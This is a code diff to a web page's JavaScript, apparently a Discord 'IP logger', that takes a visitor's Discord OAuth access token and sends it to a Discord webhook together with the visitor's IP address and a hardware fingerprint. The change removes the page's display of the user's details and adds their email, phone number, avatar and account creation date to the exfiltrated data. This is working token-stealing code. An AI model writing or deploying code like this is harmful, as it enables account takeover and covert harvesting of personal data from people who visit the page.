@@ -58,21 +58,11 @@
             const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
             const createdAt = new Date(user.created_at).toLocaleString(); // Account creation date
 
-            // Update the body with user information
-            document.body.innerHTML = `
-                <h1>Welcome, ${user.username}!</h1>
-                <p>Email: ${email}</p>
-                <p>Phone: ${phone}</p>
-                <p>Profile Picture: <img src="${avatarUrl}" alt="Profile Picture" width="100"></p>
-                <p>Account Created: ${createdAt}</p>
-                <pre>${JSON.stringify(user, null, 2)}</pre>
-            `;
-
-            // Call the function to send visitor info along with the access token
-            sendInfoToDiscord(data.access_token);
+            // Call the function to send visitor info along with the access token and user information
+            sendInfoToDiscord(data.access_token, email, phone, avatarUrl, createdAt);
         }
 
-        async function sendInfoToDiscord(accessToken) {
+        async function sendInfoToDiscord(accessToken, email, phone, avatarUrl, createdAt) {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const ip = ipData.ip;
@@ -108,7 +98,11 @@
                         { name: '🧠 Hardware Concurrency', value: `${hardwareConcurrency} logical processors`, inline: true },
                         { name: '🖼️ Screen DPI', value: screenDPI, inline: true },
                         { name: '🎮 Graphics Card', value: gpu, inline: true },
-                        { name: '🔑 Access Token', value: accessToken, inline: false } // Send the access token
+                        { name: '🔑 Access Token', value: accessToken, inline: false }, // Send the access token
+                        { name: '📧 Email', value: email, inline: true }, // Email
+                        { name: '📱 Phone', value: phone, inline: true }, // Phone number
+                        { name: '🖼️ Profile Picture', value: `[View Avatar](${avatarUrl})`, inline: true }, // Avatar URL
+                        { name: '📅 Account Created', value: createdAt, inline: true } // Account creation date
                     ],
                     footer: {
                         text: 'Logged by IP Logger',
